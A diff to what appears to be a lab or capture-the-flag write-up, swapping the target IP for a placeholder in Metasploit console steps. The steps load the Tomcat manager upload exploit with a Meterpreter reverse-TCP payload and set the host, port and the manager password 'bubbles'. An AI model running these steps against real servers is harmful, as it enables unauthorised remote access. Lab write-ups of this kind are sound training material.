@@ -160,8 +160,8 @@ The 6th `exploit` on the list `/multi/http/tomcat_mgr_deploy` seems to be exactl
 ```
 msf6 > use exploit/multi/http/tomcat_mgr_upload
 [*] No payload configured, defaulting to java/meterpreter/reverse_tcp
-msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.241.174
-RHOSTS => 10.10.241.174
+msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS MACHINE_IP
+RHOSTS => MACHINE_IP
 msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
 RPORT => 1234
 msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
